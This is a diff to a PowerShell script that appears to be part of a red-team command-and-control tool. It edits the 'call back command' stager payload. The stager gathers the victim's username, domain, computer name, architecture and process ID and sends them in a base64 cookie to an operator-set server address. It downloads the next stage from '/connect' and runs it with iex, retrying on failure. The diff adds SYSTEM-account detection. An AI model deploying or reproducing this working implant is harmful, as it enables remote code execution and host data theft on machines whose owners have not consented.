@@ -910,22 +910,23 @@ else
     write-host ""
     # call back command
     $command = 'function Get-Webclient ($Cookie) {
-    $wc = New-Object System.Net.WebClient; 
-    $wc.UseDefaultCredentials = $true; 
-    $wc.Proxy.Credentials = $wc.Credentials;
-    if ($cookie) {
-    $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
-    } $wc }
-    function primer {
-    $pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
-    $p64 = [Convert]::ToBase64String($pre)
-  $pm = (Get-Webclient -Cookie $p64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
-    $pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
-    $pm } 
-    $pm = primer
-    if ($pm) {$pm| iex} else {
-    start-sleep 10
-  primer | iex }'
+$wc = New-Object System.Net.WebClient; 
+$wc.UseDefaultCredentials = $true; 
+$wc.Proxy.Credentials = $wc.Credentials;
+if ($cookie) {
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
+} $wc }
+function primer {
+if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
+$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+$p64 = [Convert]::ToBase64String($pre)
+$pm = (Get-Webclient -Cookie $p64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
+$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
+$pm } 
+$pm = primer
+if ($pm) {$pm| iex} else {
+start-sleep 10
+primer | iex }'
     Write-Host -Object "For " -NoNewline
     Write-Host -Object "Red Teaming " -NoNewline -ForegroundColor Red
     Write-Host -Object "activities, use the following payloads:" 
